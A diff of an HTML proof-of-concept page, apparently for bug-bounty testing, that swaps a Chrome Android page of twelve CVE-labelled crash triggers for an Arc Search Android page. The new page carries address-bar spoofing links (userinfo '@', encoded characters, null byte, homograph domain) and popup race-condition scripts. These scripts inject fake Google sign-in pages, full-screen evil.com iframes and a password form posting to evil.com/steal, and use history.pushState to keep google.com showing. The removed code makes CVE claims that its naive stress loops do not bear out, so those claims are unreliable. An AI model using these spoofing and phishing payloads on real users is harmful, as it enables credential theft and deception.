@@ -1,46 +1,46 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chrome Android 2026 Bug Bounty POC</title>
+    <title>Arc Search Android Bug Bounty POC — All CVEs</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { 
-            font-family: 'Courier New', monospace; 
-            background: #0a0a0a; 
-            color: #00ff41; 
-            padding: 12px; 
-            max-width: 750px; 
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff41;
+            padding: 12px;
+            max-width: 750px;
             margin: 0 auto;
         }
-        .header { 
-            background: #1a1a1a; 
-            border: 2px solid #ff4444; 
-            padding: 12px; 
+        .header {
+            background: #1a1a1a;
+            border: 2px solid #ff4444;
+            padding: 12px;
             margin-bottom: 15px;
             text-align: center;
             border-radius: 8px;
         }
         .header h1 { font-size: 18px; color: #ff4444; }
         .header p { font-size: 11px; color: #888; }
-        .section { 
-            background: #111; 
-            border: 1px solid #333; 
-            padding: 12px; 
-            margin: 10px 0; 
+        .section {
+            background: #111;
+            border: 1px solid #333;
+            padding: 12px;
+            margin: 10px 0;
             border-radius: 6px;
         }
-        .section h2 { 
-            font-size: 14px; 
-            color: #ffaa00; 
-            border-bottom: 1px solid #333; 
+        .section h2 {
+            font-size: 14px;
+            color: #ffaa00;
+            border-bottom: 1px solid #333;
             padding-bottom: 6px;
             margin-bottom: 8px;
         }
-        .section h2 .badge { 
-            font-size: 9px; 
-            padding: 2px 6px; 
+        .section h2 .badge {
+            font-size: 9px;
+            padding: 2px 6px;
             border-radius: 8px;
             margin-left: 6px;
         }
@@ -48,37 +48,39 @@
         .badge-high { background: #ff6600; color: #fff; }
         .badge-medium { background: #ffaa00; color: #000; }
         .badge-low { background: #4488ff; color: #fff; }
-        .link-group { 
-            display: flex; 
-            flex-wrap: wrap; 
-            gap: 6px; 
+        .link-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
             margin: 6px 0;
         }
-        .link-group a, .link-group button { 
-            background: #1a1a1a; 
-            color: #00ff41; 
-            border: 1px solid #00ff41; 
-            padding: 6px 12px; 
-            font-size: 11px; 
-            cursor: pointer; 
+        .link-group a, .link-group button {
+            background: #1a1a1a;
+            color: #00ff41;
+            border: 1px solid #00ff41;
+            padding: 6px 12px;
+            font-size: 11px;
+            cursor: pointer;
             border-radius: 4px;
             text-decoration: none;
             font-family: monospace;
             transition: all 0.2s;
         }
-        .link-group a:hover, .link-group button:hover { 
-            background: #00ff41; 
-            color: #000; 
+        .link-group a:hover, .link-group button:hover {
+            background: #00ff41;
+            color: #000;
         }
         .link-group a.danger { border-color: #ff4444; color: #ff4444; }
         .link-group a.danger:hover { background: #ff4444; color: #000; }
-        .log-box { 
-            background: #0a0a0a; 
-            border: 1px solid #333; 
-            height: 150px; 
-            overflow-y: scroll; 
-            padding: 8px; 
-            font-size: 10px; 
+        .link-group a.warning { border-color: #ffaa00; color: #ffaa00; }
+        .link-group a.warning:hover { background: #ffaa00; color: #000; }
+        .log-box {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            height: 150px;
+            overflow-y: scroll;
+            padding: 8px;
+            font-size: 10px;
             color: #888;
             border-radius: 4px;
             margin-top: 8px;
@@ -88,19 +90,19 @@
         .log-box .success { color: #00ff41; }
         .log-box .warning { color: #ffaa00; }
         .log-box .info { color: #4488ff; }
-        .note { 
-            font-size: 10px; 
-            color: #666; 
+        .note {
+            font-size: 10px;
+            color: #666;
             margin-top: 4px;
             padding: 4px 8px;
             background: #0a0a0a;
             border-radius: 4px;
             border-left: 2px solid #ffaa00;
         }
-        iframe { 
-            width: 100%; 
-            height: 120px; 
-            border: 1px solid #333; 
+        iframe {
+            width: 100%;
+            height: 120px;
+            border: 1px solid #333;
             margin-top: 6px;
         }
     </style>
@@ -108,137 +110,72 @@
 <body>
 
 <div class="header">
-    <h1>🧨 Chrome Android 2026 - Bug Bounty POC</h1>
-    <p>12 CVEs • Critical • High • Medium • Low | ⚠️ Watch address bar & console</p>
+    <h1>🧨 Arc Search Android — All POCs in One</h1>
+    <p>CVE-2026-2378 Bypass · CVE-2026-12348 Bypass · Hybrid Attack</p>
 </div>
 
-<!-- ===== CVE-2026-15900: GPU Use-After-Free ===== -->
+<!-- ============================================================ -->
+<!-- SECTION 1: CVE-2026-2378 Bypass (URL Parsing)                -->
+<!-- ============================================================ -->
 <div class="section">
-    <h2>🔥 CVE-2026-15900: GPU UAF → Sandbox Escape <span class="badge badge-critical">CRITICAL</span></h2>
-    <p style="font-size:11px;color:#888;">Use-after-free in GPU — crafted HTML can escape sandbox [citation:1]</p>
+    <h2>🎯 1. CVE-2026-2378 Bypass <span class="badge badge-high">HIGH</span></h2>
+    <p style="font-size:11px;color:#888;">Address bar spoof via URL parsing tricks</p>
     <div class="link-group">
-        <button onclick="gpuUAF()">🔴 Trigger GPU UAF</button>
-        <button onclick="gpuSpam()">🔴 GPU Spam (Stress)</button>
+        <a href="https://www.google.com@evil.com" class="danger">@ Symbol</a>
+        <a href="https://www.google%2Ecom@evil.com" class="danger">%2E Encoding</a>
+        <a href="https://www.google.com%09.evil.com" class="danger">Tab Injection</a>
+        <a href="https://www.google.com%0A.evil.com" class="danger">Newline Injection</a>
+        <a href="https://арс.com" class="warning">Cyrillic 'а'</a>
+        <a href="https://evil.com@www.google.com" class="danger">Reverse @</a>
+        <a href="https://www.google.com%00.evil.com" class="danger">Null Byte</a>
+        <a href="https://www.google.com%2F@evil.com" class="danger">%2F Encoding</a>
+        <a href="https://www.google.com%5C@evil.com" class="danger">%5C Backslash</a>
     </div>
-    <div class="note">💡 If tab crashes or GPU process crashes → UAF detected</div>
+    <div class="note">💡 Address bar me <b>google.com</b> dikhe par content <b>evil.com</b> ho → BOUNTY!</div>
 </div>
 
-<!-- ===== CVE-2026-16419: ANGLE OOB ===== -->
+<!-- ============================================================ -->
+<!-- SECTION 2: CVE-2026-12348 Bypass (Race Condition)            -->
+<!-- ============================================================ -->
 <div class="section">
-    <h2>🔥 CVE-2026-16419: ANGLE OOB R/W <span class="badge badge-high">HIGH</span></h2>
-    <p style="font-size:11px;color:#888;">Out-of-bounds read/write in ANGLE → sandbox escape via HTML [citation:8]</p>
+    <h2>🏎️ 2. CVE-2026-12348 Bypass <span class="badge badge-critical">CRITICAL</span></h2>
+    <p style="font-size:11px;color:#888;">Race condition via window.open</p>
     <div class="link-group">
-        <button onclick="angleOOB()">🔴 Trigger ANGLE OOB</button>
-        <button onclick="webglAttack()">🔴 WebGL Attack</button>
+        <button onclick="raceV1()">Race Condition V1</button>
+        <button onclick="raceV2()">Race Condition V2</button>
+        <button onclick="raceV3()">Race Condition V3 (iframe)</button>
+        <button onclick="raceV4()">Race Condition V4 (history)</button>
     </div>
+    <div class="note">💡 Popup me <b>google.com</b> dikhe par content <b>malicious</b> ho → CRITICAL!</div>
 </div>
 
-<!-- ===== CVE-2026-14428: Dawn Input Validation ===== -->
+<!-- ============================================================ -->
+<!-- SECTION 3: Hybrid Attack (Combined)                          -->
+<!-- ============================================================ -->
 <div class="section">
-    <h2>🔥 CVE-2026-14428: Dawn Validation Bypass <span class="badge badge-high">HIGH (8.3)</span></h2>
-    <p style="font-size:11px;color:#888;">Insufficient validation in Dawn → sandbox escape [citation:7]</p>
+    <h2>🔥 3. Hybrid Attack <span class="badge badge-critical">CRITICAL</span></h2>
+    <p style="font-size:11px;color:#888;">CVE-2026-2378 + CVE-2026-12348 combined</p>
     <div class="link-group">
-        <button onclick="dawnAttack()">🔴 Dawn Validation Bypass</button>
+        <button onclick="hybridAttack()">Hybrid Attack</button>
+        <button onclick="hybridAttackV2()">Hybrid Attack V2</button>
+        <button onclick="hybridAttackV3()">Hybrid Attack V3 (PWA)</button>
     </div>
+    <div class="note">💡 Strongest bypass — multiple techniques combined</div>
 </div>
 
-<!-- ===== CVE-2026-11645: V8 OOB (Active Exploit) ===== -->
-<div class="section">
-    <h2>🚨 CVE-2026-11645: V8 OOB R/W <span class="badge badge-critical">ACTIVE EXPLOIT</span></h2>
-    <p style="font-size:11px;color:#ff4444;">Actively exploited in wild! Out-of-bounds in V8 → RCE [citation:6]</p>
-    <div class="link-group">
-        <button onclick="v8OOB()">🔴 V8 OOB Trigger</button>
-        <button onclick="v8ArrayAttack()">🔴 Array Manipulation</button>
-        <button onclick="v8WasmAttack()">🔴 WebAssembly Attack</button>
-    </div>
-    <div class="note">💡 CVSS 8.8 — if crash/exploit works → CRITICAL BOUNTY!</div>
-</div>
-
-<!-- ===== CVE-2026-11188: USB UAF ===== -->
-<div class="section">
-    <h2>🔥 CVE-2026-11188: USB Use-After-Free <span class="badge badge-critical">CRITICAL</span></h2>
-    <p style="font-size:11px;color:#888;">USB component UAF → sandbox escape via HTML [citation:2]</p>
-    <div class="link-group">
-        <button onclick="usbUAF()">🔴 USB UAF Trigger</button>
-        <button onclick="usbAPI()">🔴 WebUSB Attack</button>
-    </div>
-</div>
-
-<!-- ===== CVE-2026-10934: Autofill UAF ===== -->
-<div class="section">
-    <h2>🔥 CVE-2026-10934: Autofill UAF <span class="badge badge-high">HIGH</span></h2>
-    <p style="font-size:11px;color:#888;">Autofill UAF → sandbox escape [citation:4]</p>
-    <div class="link-group">
-        <button onclick="autofillUAF()">🔴 Autofill UAF</button>
-        <button onclick="autofillSpam()">🔴 Autofill Spam</button>
-    </div>
-</div>
-
-<!-- ===== CVE-2026-10923: WebAppInstalls UAF ===== -->
-<div class="section">
-    <h2>🔥 CVE-2026-10923: WebAppInstalls UAF <span class="badge badge-high">HIGH</span></h2>
-    <p style="font-size:11px;color:#888;">WebAppInstalls UAF → arbitrary code execution [citation:11]</p>
-    <div class="link-group">
-        <button onclick="webappUAF()">🔴 WebApp UAF</button>
-    </div>
-</div>
-
-<!-- ===== CVE-2026-11167: WebView Sandbox ===== -->
-<div class="section">
-    <h2>🔥 CVE-2026-11167: WebView Sandbox Escape <span class="badge badge-critical">CRITICAL</span></h2>
-    <p style="font-size:11px;color:#888;">WebView sandbox escape via crafted HTML [citation:10]</p>
-    <div class="link-group">
-        <button onclick="webviewSandbox()">🔴 WebView Escape</button>
-        <button onclick="webviewIframe()">🔴 WebView Iframe Attack</button>
-    </div>
-</div>
-
-<!-- ===== CVE-2026-11007: Cross-Origin Data Leak ===== -->
-<div class="section">
-    <h2>📊 CVE-2026-11007: Cross-Origin Data Leak <span class="badge badge-medium">MEDIUM</span></h2>
-    <p style="font-size:11px;color:#888;">WebView cross-origin data leak [citation:12]</p>
-    <div class="link-group">
-        <button onclick="crossOriginLeak()">🔴 Cross-Origin Leak</button>
-        <button onclick="postMessageLeak()">🔴 PostMessage Leak</button>
-    </div>
-</div>
-
-<!-- ===== CVE-2026-12032: Site Isolation Bypass ===== -->
-<div class="section">
-    <h2>🔓 CVE-2026-12032: Site Isolation Bypass <span class="badge badge-high">HIGH</span></h2>
-    <p style="font-size:11px;color:#888;">Passwords component → site isolation bypass [citation:5]</p>
-    <div class="link-group">
-        <button onclick="siteIsolationBypass()">🔴 Site Isolation Bypass</button>
-    </div>
-</div>
-
-<!-- ===== CVE-2026-14046: CustomTabs SOP Bypass ===== -->
-<div class="section">
-    <h2>🔓 CVE-2026-14046: CustomTabs SOP Bypass <span class="badge badge-low">LOW</span></h2>
-    <p style="font-size:11px;color:#888;">CustomTabs SOP bypass [citation:3]</p>
-    <div class="link-group">
-        <button onclick="customTabsSOP()">🔴 CustomTabs SOP</button>
-    </div>
-</div>
-
-<!-- ===== CVE-2026-7915: DevTools Navigation Bypass ===== -->
-<div class="section">
-    <h2>🔓 CVE-2026-7915: DevTools Navigation Bypass <span class="badge badge-high">HIGH</span></h2>
-    <p style="font-size:11px;color:#888;">DevTools navigation restriction bypass [citation:9]</p>
-    <div class="link-group">
-        <button onclick="devtoolsNav()">🔴 DevTools Bypass</button>
-    </div>
-</div>
-
-<!-- ===== LOGS ===== -->
+<!-- ============================================================ -->
+<!-- SECTION 4: Logs                                               -->
+<!-- ============================================================ -->
 <div class="section" style="border-color:#00ff41;">
     <h2>📋 Test Log</h2>
     <div id="log" class="log-box"></div>
     <button onclick="clearLog()" style="background:#333;color:#fff;border:none;padding:4px 12px;cursor:pointer;border-radius:3px;font-size:10px;margin-top:4px;">🗑️ Clear Log</button>
-    <button onclick="exportLog()" style="background:#333;color:#fff;border:none;padding:4px 12px;cursor:pointer;border-radius:3px;font-size:10px;margin-top:4px;">📤 Export</button>
+    <button onclick="exportLog()" style="background:#333;color:#fff;border:none;padding:4px 12px;cursor:pointer;border-radius:3px;font-size:10px;margin-top:4px;">📤 Export Log</button>
 </div>
 
-<!-- ===== SCRIPT ===== -->
+<!-- ============================================================ -->
+<!-- SCRIPT                                                        -->
+<!-- ============================================================ -->
 <script>
 // ===== LOGGING =====
 function log(msg, type = 'info') {
@@ -251,7 +188,7 @@ function log(msg, type = 'info') {
 
 function clearLog() {
     document.getElementById('log').innerHTML = '';
-    log('🗑️ Log cleared');
+    log('🗑️ Log cleared', 'info');
 }
 
 function exportLog() {
@@ -260,326 +197,178 @@ function exportLog() {
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
-    a.download = 'chrome_android_2026_bug_log.txt';
+    a.download = 'arc_bug_bounty_log.txt';
     a.click();
-    log('📤 Log exported');
+    log('📤 Log exported', 'success');
 }
 
-// ===== CVE-2026-15900: GPU UAF =====
-function gpuUAF() {
-    log('🔴 CVE-2026-15900: GPU UAF triggered', 'danger');
-    try {
-        // GPU-intensive operations to trigger UAF
-        const canvas = document.createElement('canvas');
-        canvas.width = 4096;
-        canvas.height = 4096;
-        const ctx = canvas.getContext('webgl2');
-        if (ctx) {
-            for (let i = 0; i < 1000; i++) {
-                const buffer = ctx.createBuffer();
-                ctx.deleteBuffer(buffer);
-            }
-            log('⚠️ GPU operations executed — watch for crash', 'warning');
-        }
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
-}
-
-function gpuSpam() {
-    log('🔴 GPU Spam (stress) — possible crash', 'danger');
-    for (let i = 0; i < 100; i++) {
-        const canvas = document.createElement('canvas');
-        canvas.width = 8192;
-        canvas.height = 8192;
-        canvas.getContext('webgl2');
-    }
-}
-
-// ===== CVE-2026-16419: ANGLE OOB =====
-function angleOOB() {
-    log('🔴 CVE-2026-16419: ANGLE OOB triggered', 'danger');
-    try {
-        const canvas = document.createElement('canvas');
-        canvas.width = 8192;
-        canvas.height = 8192;
-        const gl = canvas.getContext('webgl2');
-        if (gl) {
-            // OOB access attempt
-            const shader = gl.createShader(gl.VERTEX_SHADER);
-            gl.shaderSource(shader, 'void main() { gl_Position = vec4(1.0, 1.0, 1.0, 1.0); }');
-            gl.compileShader(shader);
-            const program = gl.createProgram();
-            gl.attachShader(program, shader);
-            gl.linkProgram(program);
-            gl.useProgram(program);
-            // Massive buffer operations
-            const buffer = gl.createBuffer();
-            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-            const data = new Float32Array(1000000);
-            gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
-            log('⚠️ ANGLE attack executed', 'warning');
-        }
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
-}
-
-function webglAttack() {
-    log('🔴 WebGL Attack — OOB via textures', 'danger');
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl2');
-    if (gl) {
-        for (let i = 0; i < 500; i++) {
-            const tex = gl.createTexture();
-            gl.bindTexture(gl.TEXTURE_2D, tex);
-            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-        }
-    }
-}
-
-// ===== CVE-2026-14428: Dawn =====
-function dawnAttack() {
-    log('🔴 CVE-2026-14428: Dawn validation bypass', 'danger');
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl2');
-        if (gl) {
-            // Dawn-specific exploit attempt
-            gl.getExtension('WEBGL_debug_renderer_info');
-            gl.getExtension('WEBGL_debug_shaders');
-            log('⚠️ Dawn attack executed', 'warning');
-        }
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
-}
-
-// ===== CVE-2026-11645: V8 OOB (Active) =====
-function v8OOB() {
-    log('🚨 CVE-2026-11645: V8 OOB triggered (actively exploited!)', 'danger');
-    try {
-        // Array manipulation to cause OOB
-        const arr = [1.1, 2.2, 3.3];
-        const arr2 = [1, 2, 3];
-        // Confuse V8 type system
-        for (let i = 0; i < 100000; i++) {
-            arr.push(i * 1.1);
-            arr2.push(i);
-        }
-        // OOB access attempt
-        arr[arr.length + 100000] = 9999;
-        log('⚠️ V8 OOB attempt executed', 'warning');
-    } catch(e) { 
-        log('❌ V8 caught: ' + e.message, 'info'); 
-    }
-}
-
-function v8ArrayAttack() {
-    log('🚨 V8 Array Manipulation OOB', 'danger');
-    try {
-        const a = [1.1, 2.2, 3.3];
-        const b = [1, 2, 3];
-        // JIT confusion
-        for (let i = 0; i < 1000000; i++) {
-            a.push(i * 1.1);
-            b.push(i);
-        }
-        // OOB access
-        const idx = a.length + 50000;
-        a[idx] = 9999.9;
-        b[idx] = 9999;
-        log('⚠️ Array attack executed', 'warning');
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
-}
-
-function v8WasmAttack() {
-    log('🚨 V8 WebAssembly Attack', 'danger');
-    try {
-        const wasmCode = new Uint8Array([
-            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
-            0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01,
-            0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01,
-            0x03, 0x61, 0x64, 0x64, 0x00, 0x00, 0x0a, 0x09,
-            0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x6a,
-            0x0b
-        ]);
-        WebAssembly.instantiate(wasmCode).then(m => {
-            log('⚠️ WASM instantiated — possible OOB', 'warning');
-        }).catch(e => {
-            log('❌ WASM failed: ' + e.message, 'info');
-        });
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
-}
-
-// ===== CVE-2026-11188: USB UAF =====
-function usbUAF() {
-    log('🔴 CVE-2026-11188: USB UAF triggered', 'danger');
-    try {
-        if (navigator.usb) {
-            navigator.usb.getDevices().then(devices => {
-                log('⚠️ USB devices enumerated', 'warning');
-            });
-            // Multiple rapid requests
-            for (let i = 0; i < 100; i++) {
-                navigator.usb.requestDevice({ filters: [] }).catch(() => {});
-            }
-        } else {
-            log('ℹ️ WebUSB not available', 'info');
-        }
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
-}
-
-function usbAPI() {
-    log('🔴 WebUSB Attack', 'danger');
-    try {
-        if (navigator.usb) {
-            for (let i = 0; i < 50; i++) {
-                navigator.usb.getDevices().then(() => {});
-                setTimeout(() => navigator.usb.requestDevice({ filters: [] }).catch(() => {}), i * 10);
-            }
-        }
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
-}
-
-// ===== CVE-2026-10934: Autofill UAF =====
-function autofillUAF() {
-    log('🔴 CVE-2026-10934: Autofill UAF triggered', 'danger');
-    try {
-        const forms = document.querySelectorAll('form');
-        for (let i = 0; i < 1000; i++) {
-            const form = document.createElement('form');
-            form.innerHTML = `<input type="text" name="test" autocomplete="username">
-                             <input type="password" name="pwd" autocomplete="current-password">`;
-            document.body.appendChild(form);
-            setTimeout(() => form.remove(), 10);
-        }
-        log('⚠️ Autofill attack executed', 'warning');
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
-}
-
-function autofillSpam() {
-    log('🔴 Autofill Spam', 'danger');
-    for (let i = 0; i < 500; i++) {
-        const form = document.createElement('form');
-        form.innerHTML = `<input type="text" name="user${i}" autocomplete="username">
-                         <input type="password" name="pass${i}" autocomplete="current-password">`;
-        document.body.appendChild(form);
-        setTimeout(() => form.remove(), 5);
-    }
-}
-
-// ===== CVE-2026-10923: WebAppInstalls UAF =====
-function webappUAF() {
-    log('🔴 CVE-2026-10923: WebAppInstalls UAF triggered', 'danger');
-    try {
-        if ('BeforeInstallPromptEvent' in window) {
-            // Simulate PWA install prompt
-            const event = new Event('beforeinstallprompt');
-            window.dispatchEvent(event);
-            log('⚠️ WebApp install triggered', 'warning');
-        }
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
-}
-
-// ===== CVE-2026-11167: WebView Sandbox =====
-function webviewSandbox() {
-    log('🔴 CVE-2026-11167: WebView Sandbox Escape', 'danger');
-    try {
-        const iframe = document.createElement('iframe');
-        iframe.sandbox = 'allow-scripts allow-same-origin';
-        iframe.src = 'data:text/html,<html><body><script>alert("Sandbox Escape?")</script></body></html>';
-        document.body.appendChild(iframe);
-        log('⚠️ WebView sandbox attack executed', 'warning');
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
-}
-
-function webviewIframe() {
-    log('🔴 WebView Iframe Attack', 'danger');
-    const iframe = document.createElement('iframe');
-    iframe.src = 'about:blank';
-    document.body.appendChild(iframe);
-    try {
-        iframe.contentWindow.document.write('<html><body><h1>XSS via WebView</h1></body></html>');
-        log('⚠️ Iframe DOM access successful', 'danger');
-    } catch(e) {
-        log('❌ Iframe access blocked: ' + e.message, 'info');
-    }
-}
-
-// ===== CVE-2026-11007: Cross-Origin Leak =====
-function crossOriginLeak() {
-    log('🔴 CVE-2026-11007: Cross-Origin Data Leak', 'danger');
-    try {
-        const iframe = document.createElement('iframe');
-        iframe.src = 'https://example.com';
-        document.body.appendChild(iframe);
+// Log all link clicks
+document.querySelectorAll('a').forEach(a => {
+    a.addEventListener('click', function(e) {
+        const text = this.textContent.trim() || this.href;
+        log(`🔗 Clicked: ${text} — watch address bar!`, 'warning');
         setTimeout(() => {
-            try {
-                const doc = iframe.contentDocument || iframe.contentWindow.document;
-                log('✅ Cross-origin data accessible! CRITICAL!', 'danger');
-            } catch(e) {
-                log('❌ Cross-origin blocked: ' + e.message, 'info');
-            }
-        }, 1000);
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
+            log(`📌 Current URL: ${this.href}`, 'info');
+        }, 500);
+    });
+});
+
+// ================================================================
+// 2. RACE CONDITION FUNCTIONS
+// ================================================================
+
+function raceV1() {
+    log('🏎️ Race V1 triggered', 'danger');
+    let win = window.open('about:blank', '_blank');
+    setTimeout(() => {
+        win.location = 'https://www.google.com';
+        setTimeout(() => {
+            win.document.write(`
+                <html><body>
+                    <h1 style="color:red;">🚨 ATTACKER CONTENT</h1>
+                    <p>Address bar shows google.com but this is evil!</p>
+                    <form action="https://evil.com/steal">
+                        <input type="password" placeholder="Enter password">
+                        <button>Submit</button>
+                    </form>
+                </body></html>
+            `);
+            log('⚠️ Malicious content injected — check address bar!', 'danger');
+        }, 50);
+    }, 50);
 }
 
-function postMessageLeak() {
-    log('🔴 PostMessage Data Leak', 'danger');
-    const iframe = document.createElement('iframe');
-    iframe.src = 'https://example.com';
-    document.body.appendChild(iframe);
+function raceV2() {
+    log('🏎️ Race V2 triggered', 'danger');
+    let win = window.open('https://evil.com', '_blank');
     setTimeout(() => {
-        try {
-            iframe.contentWindow.postMessage('TEST_DATA', '*');
-            log('⚠️ PostMessage sent — check if received', 'warning');
-        } catch(e) {
-            log('❌ PostMessage blocked', 'info');
-        }
+        win.location = 'https://www.google.com';
+        setTimeout(() => {
+            let iframe = win.document.createElement('iframe');
+            iframe.src = 'https://evil.com';
+            iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:9999;';
+            win.document.body.innerHTML = '';
+            win.document.body.appendChild(iframe);
+            log('⚠️ Iframe injected — check address bar!', 'danger');
+        }, 100);
+    }, 100);
+}
+
+function raceV3() {
+    log('🏎️ Race V3 (iframe) triggered', 'danger');
+    let win = window.open('about:blank', '_blank');
+    setTimeout(() => {
+        win.location = 'https://www.google.com';
+        setTimeout(() => {
+            win.document.write(`
+                <html><body>
+                    <h1>Google</h1>
+                    <iframe src="https://evil.com" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;"></iframe>
+                </body></html>
+            `);
+            log('⚠️ Iframe overlay injected', 'danger');
+        }, 100);
+    }, 100);
+}
+
+function raceV4() {
+    log('🏎️ Race V4 (history) triggered', 'danger');
+    let win = window.open('https://www.google.com', '_blank');
+    setTimeout(() => {
+        win.history.pushState({}, 'Google', 'https://www.google.com/fake');
+        setTimeout(() => {
+            win.document.write(`
+                <html><body>
+                    <h1 style="color:red;">🚨 PHISHING PAGE</h1>
+                    <p>Address bar locked to google.com</p>
+                </body></html>
+            `);
+            log('⚠️ history.pushState used — address bar locked?', 'danger');
+        }, 100);
     }, 500);
 }
 
-// ===== CVE-2026-12032: Site Isolation Bypass =====
-function siteIsolationBypass() {
-    log('🔴 CVE-2026-12032: Site Isolation Bypass', 'danger');
-    try {
-        const iframe = document.createElement('iframe');
-        iframe.src = 'data:text/html,<html><body><h1>Site Isolation Test</h1></body></html>';
-        document.body.appendChild(iframe);
-        // Cross-origin access attempt
+// ================================================================
+// 3. HYBRID ATTACK FUNCTIONS
+// ================================================================
+
+function hybridAttack() {
+    log('🔥 Hybrid Attack triggered', 'danger');
+    let win = window.open('https://www.google.com', '_blank');
+    setTimeout(() => {
+        win.history.pushState({}, 'Google', 'https://www.google.com/fake');
         setTimeout(() => {
-            try {
-                const content = iframe.contentWindow.document.body.innerHTML;
-                log('✅ Site isolation bypassed! DATA: ' + content, 'danger');
-            } catch(e) {
-                log('❌ Site isolation working: ' + e.message, 'info');
-            }
-        }, 500);
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
+            let iframe = win.document.createElement('iframe');
+            iframe.src = 'https://evil.com';
+            iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;';
+            win.document.body.innerHTML = '';
+            win.document.body.appendChild(iframe);
+            win.history.pushState({}, 'Google', 'https://www.google.com/locked');
+            log('⚠️ Hybrid attack executed — address bar locked?', 'danger');
+        }, 200);
+    }, 500);
 }
 
-// ===== CVE-2026-14046: CustomTabs SOP =====
-function customTabsSOP() {
-    log('🔴 CVE-2026-14046: CustomTabs SOP Bypass', 'danger');
-    try {
-        // CustomTabs-specific attack
-        const url = 'https://example.com';
-        window.open(url, '_blank');
-        log('⚠️ CustomTabs SOP attack attempted', 'warning');
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
+function hybridAttackV2() {
+    log('🔥 Hybrid Attack V2 triggered', 'danger');
+    let win = window.open('https://www.google.com@evil.com', '_blank');
+    setTimeout(() => {
+        win.history.pushState({}, 'Google', 'https://www.google.com/secure');
+        setTimeout(() => {
+            win.document.write(`
+                <html><body style="background:#fff;">
+                    <h1 style="color:red;">🚨 FAKE GOOGLE</h1>
+                    <p>This is a phishing page!</p>
+                    <input type="password" placeholder="Enter your Google password">
+                    <button onclick="alert('Password stolen!')">Submit</button>
+                </body></html>
+            `);
+            win.history.pushState({}, 'Google', 'https://www.google.com');
+            log('⚠️ Hybrid V2 — fake Google page injected', 'danger');
+        }, 150);
+    }, 150);
 }
 
-// ===== CVE-2026-7915: DevTools Navigation =====
-function devtoolsNav() {
-    log('🔴 CVE-2026-7915: DevTools Navigation Bypass', 'danger');
-    try {
-        // DevTools protocol attack
-        console.log('DevTools Attack Payload');
-        console.log('%cMalicious CSS', 'font-size:100000px;');
-        log('⚠️ DevTools attack executed', 'warning');
-    } catch(e) { log('❌ Error: ' + e.message, 'danger'); }
+function hybridAttackV3() {
+    log('🔥 Hybrid Attack V3 (PWA style) triggered', 'danger');
+    let win = window.open('https://www.google.com', '_blank');
+    setTimeout(() => {
+        // Try to make it look like a PWA
+        win.document.write(`
+            <html><head>
+                <meta name="apple-mobile-web-app-capable" content="yes">
+                <meta name="mobile-web-app-capable" content="yes">
+                <style>
+                    * { margin:0; padding:0; }
+                    body { font-family: Arial; }
+                    .header { background:#4285f4; color:#fff; padding:15px; }
+                    .content { padding:20px; }
+                    input { width:100%; padding:12px; margin:10px 0; border:1px solid #ddd; }
+                    button { width:100%; padding:12px; background:#4285f4; color:#fff; border:none; }
+                </style>
+            </head><body>
+                <div class="header"><h1>Google</h1></div>
+                <div class="content">
+                    <h2>Sign in</h2>
+                    <input type="email" placeholder="Email or phone">
+                    <input type="password" placeholder="Password">
+                    <button onclick="alert('Credentials stolen!')">Next</button>
+                    <p style="color:#888;font-size:12px;margin-top:20px;">🔒 Secure connection</p>
+                </div>
+            </body></html>
+        `);
+        // Lock address bar
+        win.history.pushState({}, 'Google Sign In', 'https://www.google.com/signin');
+        log('⚠️ PWA-style phishing page — address bar shows google.com', 'danger');
+    }, 300);
 }
 
-// ===== INIT =====
-log('🚀 Chrome Android 2026 Bug Bounty POC Loaded', 'success');
-log('📌 12 CVEs: Critical(4) High(6) Medium(1) Low(1)', 'warning');
-log('💡 Click each button — watch for crashes, alerts, data leaks', 'info');
+// ================================================================
+// INIT
+// ================================================================
+log('🚀 All POCs Loaded Successfully', 'success');
+log('📌 CVE-2026-2378 Bypass (9 links) + CVE-2026-12348 Bypass (4 buttons) + Hybrid (3 buttons)', 'info');
+log('💡 Click each and watch address bar carefully!', 'warning');
 </script>
-
 </body>
 </html>
